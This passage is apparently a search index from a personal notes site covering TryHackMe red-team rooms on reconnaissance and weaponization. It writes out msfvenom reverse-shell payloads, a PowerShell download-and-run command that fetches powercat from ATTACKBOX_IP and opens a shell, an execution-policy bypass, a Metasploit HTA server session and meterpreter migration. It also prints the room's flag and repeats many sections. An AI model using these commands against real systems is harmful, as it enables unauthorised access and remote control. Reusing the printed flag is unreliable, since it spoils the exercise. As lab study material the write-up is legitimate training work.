gi\u1ea3 kh\u00e1c nhau v\u00e0 cung c\u1ea5p v\u00f4 s\u1ed1 ch\u1ee9c n\u0103ng. M\u1ed9t s\u1ed1 m\u00f4-\u0111un y\u00eau c\u1ea7u c\u00e1c ph\u00edm \u0111\u1ec3 ho\u1ea1t \u0111\u1ed9ng; kh\u00f3a cho ph\u00e9p m\u00f4-\u0111un truy v\u1ea5n API tr\u1ef1c tuy\u1ebfn c\u00f3 li\u00ean quan. Trong nhi\u1ec7m v\u1ee5 n\u00e0y, ch\u00fang t\u00f4i s\u1ebd minh h\u1ecda b\u1eb1ng c\u00e1ch s\u1eed d\u1ee5ng Recon-ng trong thi\u1ebft b\u1ecb \u0111\u1ea7u cu\u1ed1i. marketplace search KEYWORD\u0111\u1ec3 t\u00ecm ki\u1ebfm c\u00e1c m\u00f4-\u0111un c\u00f3 s\u1eb5n v\u1edbi t\u1eeb kh\u00f3a . marketplace info MODULE\u0111\u1ec3 cung c\u1ea5p th\u00f4ng tin v\u1ec1 m\u00f4-\u0111un \u0111\u01b0\u1ee3c \u0111\u1ec1 c\u1eadp. marketplace install MODULE\u0111\u1ec3 c\u00e0i \u0111\u1eb7t m\u00f4-\u0111un \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh v\u00e0o Recon-ng. marketplace remove MODULE\u0111\u1ec3 g\u1ee1 c\u00e0i \u0111\u1eb7t m\u00f4-\u0111un \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh. tra ip ng\u01b0\u1ee3c: https://viewdns.info/ https://search.censys.io/ https://www.google.com/advanced_search reverse shell for window: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta reverse shell for window with vba: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.80.57 LPORT=443 -f vba","title":"Init Access"},{"location":"tryhackme/room/l/red-team-reconnaissance/#init-access","text":"C\u00f3 m\u1ed9t c\u00e2u n\u00f3i r\u1ea5t hay \"Bi\u1ebft ng\u01b0\u1eddi bi\u1ebft ta, tr\u0103m tr\u1eadn tr\u0103m th\u1eafng\". \u0110\u1ea7u ti\u00ean khi ta b\u01b0\u1edbc v\u00e0o giai \u0111o\u1ea1n t\u1ea5n c\u00f4ng m\u1ed9t th\u1ee9 g\u00ec \u0111\u00f3 th\u00ec vi\u1ec7c hi\u1ec3u v\u1ec1 n\u00f3 th\u1ef1c s\u1ef1 c\u1ea7n thi\u1ebft. B\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o m\u1ed9t v\u00e0i k\u0129 thu\u1eadt do th\u00e1m t\u1eeb v\u1ecb tr\u00ed c\u1ee7a Redteam nh\u01b0 sau: Types of reconnaissance activities WHOIS and DNS-based reconnaissance Advanced searching Searching by image Google Hacking Specialized search engines Recon-ng Maltego","title":"Init Access"},{"location":"tryhackme/room/l/red-team-reconnaissance/#types-of-reconnaissance-activities-cac-loai-trinh-sat","text":"Trinh s\u00e1t c\u00f3 th\u1ec3 chia l\u00e0m 2 lo\u1ea1i: Trinh s\u00e1t b\u1ecb \u0111\u1ed9ng: C\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n b\u1eb1ng vi\u1ec7c quan s\u00e1t nh\u1eefng g\u00ec c\u00f3 s\u1eb5n \u1edf m\u1ee5c ti\u00eau ho\u1eb7c \u1edf b\u00ean th\u1ee9 ba cung c\u1ea5p (d\u00f9ng c\u00e1c k\u0129 thu\u1eadt nh\u01b0 OSINT \u0111\u1ec3 thu th\u1eadp th\u00f4ng tin, ... whois, nslookup, dig, shodan.io, DNSDumpster,...) Trinh s\u00e1t ch\u1ee7 \u0111\u1ed9ng: C\u1ea7n ch\u1ee7 \u0111\u1ed9ng, t\u01b0\u01a1ng t\u00e1c v\u1edbi m\u1ee5c ti\u00eau nh\u1eb1m xem ph\u1ea3n \u1ee9ng c\u1ee7a n\u00f3 (c\u00e1c c\u00f4ng c\u1ee5 \u0111\u01b0\u1ee3c d\u00f9ng nh\u01b0 netcat, ping, traceroute, telnet, ...). Trong trinh s\u00e1t ch\u1ee7 \u0111\u1ed9ng, c\u00f3 th\u1ec3 chia l\u00e0m 2 nh\u00e1nh ti\u1ebfp c\u1eadn sau: Trinh s\u00e1t t\u1eeb b\u00ean ngo\u00e0i: \u0110\u01b0\u1ee3c ti\u1ebfn h\u00e0nh trinh s\u00e1t t\u1eeb b\u00ean ngo\u00e0i m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a m\u1ee5c ti\u00eau. Trinh s\u00e1t t\u1eeb b\u00ean trong: \u0110\u01b0\u1ee3c ti\u1ebfn h\u00e0nh trinh s\u00e1t t\u1eeb b\u00ean trong m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a m\u1ee5c ti\u00eau Recon-ng l\u00e0 m\u1ed9t framework gi\u00fap t\u1ef1 \u0111\u1ed9ng h\u00f3a c\u00f4ng vi\u1ec7c OSINT. N\u00f3 s\u1eed d\u1ee5ng c\u00e1c m\u00f4-\u0111un t\u1eeb nhi\u1ec1u t\u00e1c gi\u1ea3 kh\u00e1c nhau v\u00e0 cung c\u1ea5p v\u00f4 s\u1ed1 ch\u1ee9c n\u0103ng. M\u1ed9t s\u1ed1 m\u00f4-\u0111un y\u00eau c\u1ea7u c\u00e1c ph\u00edm \u0111\u1ec3 ho\u1ea1t \u0111\u1ed9ng; kh\u00f3a cho ph\u00e9p m\u00f4-\u0111un truy v\u1ea5n API tr\u1ef1c tuy\u1ebfn c\u00f3 li\u00ean quan. Trong nhi\u1ec7m v\u1ee5 n\u00e0y, ch\u00fang t\u00f4i s\u1ebd minh h\u1ecda b\u1eb1ng c\u00e1ch s\u1eed d\u1ee5ng Recon-ng trong thi\u1ebft b\u1ecb \u0111\u1ea7u cu\u1ed1i. marketplace search KEYWORD\u0111\u1ec3 t\u00ecm ki\u1ebfm c\u00e1c m\u00f4-\u0111un c\u00f3 s\u1eb5n v\u1edbi t\u1eeb kh\u00f3a . marketplace info MODULE\u0111\u1ec3 cung c\u1ea5p th\u00f4ng tin v\u1ec1 m\u00f4-\u0111un \u0111\u01b0\u1ee3c \u0111\u1ec1 c\u1eadp. marketplace install MODULE\u0111\u1ec3 c\u00e0i \u0111\u1eb7t m\u00f4-\u0111un \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh v\u00e0o Recon-ng. marketplace remove MODULE\u0111\u1ec3 g\u1ee1 c\u00e0i \u0111\u1eb7t m\u00f4-\u0111un \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh. tra ip ng\u01b0\u1ee3c: https://viewdns.info/ https://search.censys.io/ https://www.google.com/advanced_search reverse shell for window: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta reverse shell for window with vba: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.80.57 LPORT=443 -f vba","title":"Types of reconnaissance activities (c\u00e1c lo\u1ea1i trinh s\u00e1t)"},{"location":"tryhackme/room/l/red-team-weaponization/","tags":["THM-Room"],"text":"Weaponization \u00b6 Task 6: PowerShell - PSH \u00b6 PowerShell (PSH) \u00b6 PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, Hacking with PowerShell for more information about PowerShell . Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints \"Welcome to the Weaponization Room!\" as follows, Write-Output \"Welcome to the Weaponization Room!\" Save the file as thm.ps1 . With the Write-Output , we print the message \"Welcome to the Weaponization Room!\" to the command prompt. Now let's run it and see the result. CMD C :\\ Users \\ thm \\ Desktop > powershell -File thm . ps1 File C :\\ Users \\ thm \\ Desktop \\ thm . ps1 cannot be loaded because running scripts is disabled on this system . For more information , see about_Execution_Policies at http :// go . microsoft . com / fwlink / ? LinkID = 135170 . + CategoryInfo : SecurityError : (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : UnauthorizedAccess C :\\ Users \\ thm \\ Desktop > Execution Policy \u00b6 PowerShell 's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted , which means it permits individual commands but not run any scripts. CMD PS C :\\ Users \\ thm > Get-ExecutionPolicy Restricted We can also easily change the PowerShell execution policy by running: CMD PS C :\\ Users \\ thm \\ Desktop > Set-ExecutionPolicy -Scope CurrentUser RemoteSigned Execution Policy Change The execution policy helps protect you from scripts that you do not trust . Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at http :// go . microsoft . com / fwlink / ? LinkID = 135170 . Do you want to change the execution policy ? [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help ( default is \"N\" ): A Bypass Execution Policy \u00b6 Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts. In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows, CMD C :\\ Users \\ thm \\ Desktop > powershell -ex bypass -File thm . ps1 Welcome to Weaponization Room ! Now, let's try to get a reverse shell using one of the tools written in PowerShell , which is powercat . On your AttackBox, download it from GitHub and run a webserver to deliver the payload. CMD user @machine $ git clone https :// github . com / besimorhino / powercat . git Cloning into 'powercat' ... remote : Enumerating objects : 239 , done . remote : Counting objects : 100 % ( 4 / 4 ), done . remote : Compressing objects : 100 % ( 4 / 4 ), done . remote : Total 239 ( delta 0 ), reused 2 ( delta 0 ), pack-reused 235 Receiving objects : 100 % ( 239 / 239 ), 61 . 75 KiB | 424 . 00 KiB / s , done . Resolving deltas : 100 % ( 72 / 72 ), done . Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080 . Terminal user @machine $ cd powercat user @machine $ python3 -m http . server 8080 Serving HTTP on 0 . 0 . 0 . 0 port 8080 ( http :// 0 . 0 . 0 . 0 : 8080 /) ... On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim. Terminal user @machine $ nc -lvp 1337 Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows, Terminal C :\\ Users \\ thm \\ Desktop > powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd\" Now that we have executed the command above, the victim machine downloads the powercat.ps1 payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337 . After a couple of seconds, we should receive the connection call back: Terminal user @machine $ nc -lvp 1337 listening on [any] 1337 ... 10 . 10 . 12 . 53 : inverse host lookup failed : Unknown host connect to [ 10 . 8 . 232 . 37 ] from ( UNKNOWN ) [ 10 . 10 . 12 . 53 ] 49804 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation . All rights reserved . C :\\ Users \\ thm > Task 7: Command And Control - ( C2 Or C&C) \u00b6 This task introduces the basic concept of Command and Control ( C2 ) frameworks used in Red team operations. Alt text What is Command and Control ( C2 )? \u00b6 C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to: Generate various malicious payloads Enumerate the compromised machine/networks Perform privilege escalation and pivoting Lateral movement And many others Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system. Cobalt Strike \u00b6 Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements. PowerShell Empire \u00b6 PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: Empire . Metasploit \u00b6 Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest checking the Metasploit module . Most of the C2 frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the C2 framework, we invite you to check the Intro to C2 room. Task 8: Delivery Techniques \u00b6 Delivery Techniques \u00b6 Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content. Alt text Email Delivery \u00b6 It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit here . This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host. The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record. The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations. Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks. Alt text Web Delivery \u00b6 Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit here . This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method. In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine. Alt text USB Delivery \u00b6 This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit here . Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment. Common USB attacks used to weaponize USB devices include Rubber Ducky and SBHarpoon , charging USB cable, such as O.MG Cable . Task 9: Practice Arena \u00b6 We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://MACHINE_IP:8080/ . Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN. Alt text The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link. Note for Doc files : the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate . In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow, Terminal meterpreter > run post / windows / manage / migrate [*] Running module against DESKTOP - 1AU6NT4 [*] Current server process : svchost . exe ( 3280 ) [*] Spawning notepad . exe process to migrate into [*] Spoofing PPID 0 [*] Migrating into 4960 [+] Successfully migrated into process 4960 In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell. For reference, you can use the MSFVenom Cheat Sheet on this website . Answer the questions below What is the flag? Hint: Check the user desktop folder for the flag! Answer Explain THM { b4dbc2f16afdfe9579030a929b799719 } We will use script from task 4, two way to solve: The first way: We will create file reverse shell from msfvenom by: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=443 -f hta-psh -o thm.hta . And then send it to vim by python3 -m http.server 8080 . In attack machine, listen by nc -lnvp 443 . Terminal \u250c\u2500\u2500 ( kali \u327f kali )-[~] \u2514\u2500 $ nc -lvnp 443 listening on [any] 443 ... connect to [ 10 . 18 . 80 . 57 ] from ( UNKNOWN ) [ 10 . 10 . 142 . 139 ] 49917 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation . All rights reserved . C :\\ app > ls -a ls -a 'ls' is not recognized as an internal or external command , operable program or batch file . Because this is a reverse shell from windows, you have to use a script to work on windows (using ls like on linux won't work). Now, we will search the Desktop of each user in the machine, we will get the flag The first way: This is a way to help us use linux command on the victim's terminal. Step by step is the same Task 4: Step 1: msfconsole -q Step 2: use exploit/windows/misc/hta_server Step 3: set LHOST ATTACKER_IP Step 4: set LPORT ATTACKER_PORT_OPEN Step 5: set SRVHOST ATTACKER_IP Step 6: set payload windows/meterpreter/reverse_tcp Step 7: exploit Terminal msf6 > use exploit / windows / misc / hta_server [*] No payload configured , defaulting to windows / meterpreter / reverse_tcp msf6 exploit ( windows / misc / hta_server ) > set lhost 10 . 18 . 80 . 57 lhost => 10 . 18 . 80 . 57 msf6 exploit ( windows / misc / hta_server ) > set lport 443 lport => 443 msf6 exploit ( windows / misc / hta_server ) > set srvhost 10 . 18 . 80 . 57 srvhost => 10 . 18 . 80 . 57 msf6 exploit ( windows / misc / hta_server ) > set payload windows / meterpreter / reverse_tcp payload => windows / meterpreter / reverse_tcp msf6 exploit ( windows / misc / hta_server ) > exploit [*] Exploit running as background job 0 . [*] Exploit completed , but no session was created . [*] Started reverse TCP handler on 10 . 18 . 80 . 57 : 443 msf6 exploit ( windows / misc / hta_server ) > [*] Using URL : http :// 10 . 18 . 80 . 57 : 8080 / hmMe6s . hta [*] Server started . Step 8: We will notice a highlighted url like the above terminal, send it to the victim website Alt text Step 9: Find sessions to work by: session -i command Step 10: Get flag Now, go back to the terminal with metasploit and we see that we have successfully connected to the windows shell Alt text","title":"Weaponization"},{"location":"tryhackme/room/l/red-team-weaponization/#weaponization","text":"","title":"Weaponization"},{"location":"tryhackme/room/l/red-team-weaponization/#task-6-powershell-psh","text":"","title":"Task 6: PowerShell - PSH"},{"location":"tryhackme/room/l/red-team-weaponization/#powershell-psh","text":"PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, Hacking with PowerShell for more information about PowerShell . Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints \"Welcome to the Weaponization Room!\" as follows, Write-Output \"Welcome to the Weaponization Room!\" Save the file as thm.ps1 . With the Write-Output , we print the message \"Welcome to the Weaponization Room!\" to the command prompt. Now let's run it and see the result. CMD C :\\ Users \\ thm \\ Desktop > powershell -File thm . ps1 File C :\\ Users \\ thm \\ Desktop \\ thm . ps1 cannot be loaded because running scripts is disabled on this system . For more information , see about_Execution_Policies at http :// go . microsoft . com / fwlink / ? LinkID = 135170 . + CategoryInfo : SecurityError : (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : UnauthorizedAccess C :\\ Users \\ thm \\ Desktop >","title":"PowerShell (PSH)"},{"location":"tryhackme/room/l/red-team-weaponization/#execution-policy","text":"PowerShell 's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted , which means it permits individual commands but not run any scripts. CMD PS C :\\ Users \\ thm > Get-ExecutionPolicy Restricted We can also easily change the PowerShell execution policy by running: CMD PS C :\\ Users \\ thm \\ Desktop > Set-ExecutionPolicy -Scope CurrentUser RemoteSigned Execution Policy Change The execution policy helps protect you from scripts that you do not trust . Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at http :// go . microsoft . com / fwlink / ? LinkID = 135170 . Do you want to change the execution policy ? [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help ( default is \"N\" ): A","title":"Execution Policy"},{"location":"tryhackme/room/l/red-team-weaponization/#bypass-execution-policy","text":"Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts. In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows, CMD C :\\ Users \\ thm \\ Desktop > powershell -ex bypass -File thm . ps1 Welcome to Weaponization Room ! Now, let's try to get a reverse shell using one of the tools written in PowerShell , which is powercat . On your AttackBox, download it from GitHub and run a webserver to deliver the payload. CMD user @machine $ git clone https :// github . com / besimorhino / powercat . git Cloning into 'powercat' ... remote : Enumerating objects : 239 , done . remote : Counting objects : 100 % ( 4 / 4 ), done . remote : Compressing objects : 100 % ( 4 / 4 ), done . remote : Total 239 ( delta 0 ), reused 2 ( delta 0 ), pack-reused 235 Receiving objects : 100 % ( 239 / 239 ), 61 . 75 KiB | 424 . 00 KiB / s , done . Resolving deltas : 100 % ( 72 / 72 ), done . Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080 . Terminal user @machine $ cd powercat user @machine $ python3 -m http . server 8080 Serving HTTP on 0 . 0 . 0 . 0 port 8080 ( http :// 0 . 0 . 0 . 0 : 8080 /) ... On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim. Terminal user @machine $ nc -lvp 1337 Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows, Terminal C :\\ Users \\ thm \\ Desktop > powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd\" Now that we have executed the command above, the victim machine downloads the powercat.ps1 payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337 . After a couple of seconds, we should receive the connection call back: Terminal user @machine $ nc -lvp 1337 listening on [any] 1337 ... 10 . 10 . 12 . 53 : inverse host lookup failed : Unknown host connect to [ 10 . 8 . 232 . 37 ] from ( UNKNOWN ) [ 10 . 10 . 12 . 53 ] 49804 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation . All rights reserved . C :\\ Users \\ thm >","title":"Bypass Execution Policy"},{"location":"tryhackme/room/l/red-team-weaponization/#task-7-command-and-control-c2-or-cc","text":"This task introduces the basic concept of Command and Control ( C2 ) frameworks used in Red team operations. Alt text","title":"Task 7: Command And Control - (C2 Or C&amp;C)"},{"location":"tryhackme/room/l/red-team-weaponization/#what-is-command-and-control-c2","text":"C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to: Generate various malicious payloads Enumerate the compromised machine/networks Perform privilege escalation and pivoting Lateral movement And many others Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system.","title":"What is Command and Control (C2)?"},{"location":"tryhackme/room/l/red-team-weaponization/#cobalt-strike","text":"Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.","title":"Cobalt Strike"},{"location":"tryhackme/room/l/red-team-weaponization/#powershell-empire","text":"PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: Empire .","title":"PowerShell Empire"},{"location":"tryhackme/room/l/red-team-weaponization/#metasploit","text":"Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest checking the Metasploit module . Most of the C2 frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the C2 framework, we invite you to check the Intro to C2 room.","title":"Metasploit"},{"location":"tryhackme/room/l/red-team-weaponization/#task-8-delivery-techniques","text":"","title":"Task 8: Delivery Techniques"},{"location":"tryhackme/room/l/red-team-weaponization/#delivery-techniques","text":"Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content. Alt text","title":"Delivery Techniques"},{"location":"tryhackme/room/l/red-team-weaponization/#email-delivery","text":"It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit here . This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host. The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record. The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations. Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks. Alt text","title":"Email Delivery"},{"location":"tryhackme/room/l/red-team-weaponization/#web-delivery","text":"Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit here . This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method. In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine. Alt text","title":"Web Delivery"},{"location":"tryhackme/room/l/red-team-weaponization/#usb-delivery","text":"This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit here . Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment. Common USB attacks used to weaponize USB devices include Rubber Ducky and SBHarpoon , charging USB cable, such as O.MG Cable .","title":"USB Delivery"},{"location":"tryhackme/room/l/red-team-weaponization/#task-9-practice-arena","text":"We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://MACHINE_IP:8080/ . Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN. Alt text The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link. Note for Doc files : the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate . In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow, Terminal meterpreter > run post / windows / manage / migrate [*] Running module against DESKTOP - 1AU6NT4 [*] Current server process : svchost . exe ( 3280 ) [*] Spawning notepad . exe process to migrate into [*] Spoofing PPID 0 [*] Migrating into 4960 [+] Successfully migrated into process 4960 In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell. For reference, you can use the MSFVenom Cheat Sheet on this website . Answer the questions below What is the flag? Hint: Check the user desktop folder for the flag! Answer Explain THM { b4dbc2f16afdfe9579030a929b799719 } We will use script from task 4, two way to solve: The first way: We will create file reverse shell from msfvenom by: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=443 -f hta-psh -o thm.hta . And then send it to vim by python3 -m http.server 8080 . In attack machine, listen by nc -lnvp 443 . Terminal \u250c\u2500\u2500 ( kali \u327f kali )-[~] \u2514\u2500 $ nc -lvnp 443 listening on [any] 443 ... connect to [ 10 . 18 . 80 . 57 ] from ( UNKNOWN ) [ 10 . 10 . 142 . 139 ] 49917 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation . All rights reserved . C :\\ app > ls -a ls -a 'ls' is not recognized as an internal or external command , operable program or batch file . Because this is a reverse shell from windows, you have to use a script to work on windows (using ls like on linux won't work). Now, we will search the Desktop of each user in the machine, we will get the flag The first way: This is a way to help us use linux command on the victim's terminal. Step by step is the same Task 4: Step 1: msfconsole -q Step 2: use exploit/windows/misc/hta_server Step 3: set LHOST ATTACKER_IP Step 4: set LPORT ATTACKER_PORT_OPEN Step 5: set SRVHOST ATTACKER_IP Step 6: set payload windows/meterpreter/reverse_tcp Step 7: exploit Terminal msf6 > use exploit / windows / misc / hta_server [*] No payload configured , defaulting to windows / meterpreter / reverse_tcp msf6 exploit ( windows / misc / hta_server ) > set lhost 10 . 18 . 80 . 57 lhost => 10 . 18 . 80 . 57 msf6 exploit ( windows / misc / hta_server ) > set lport 443 lport => 443 msf6 exploit ( windows / misc / hta_server ) > set srvhost 10 . 18 . 80 . 57 srvhost => 10 . 18 . 80 . 57 msf6 exploit ( windows / misc / hta_server ) > set payload windows / meterpreter / reverse_tcp payload => windows / meterpreter / reverse_tcp msf6 exploit ( windows / misc / hta_server ) > exploit [*] Exploit running as background job 0 . [*] Exploit completed , but no session was created . [*] Started reverse TCP handler on 10 . 18 . 80 . 57 : 443 msf6 exploit ( windows / misc / hta_server ) > [*] Using URL : http :// 10 . 18 . 80 . 57 : 8080 / hmMe6s . hta [*] Server started . Step 8: We will notice a highlighted url like the above terminal, send it to the victim website Alt text Step 9: Find sessions to work by: session -i command Step 10: Get flag Now, go back to the terminal with metasploit and we see that we have successfully connected to the windows shell Alt text","title":"Task 9: Practice 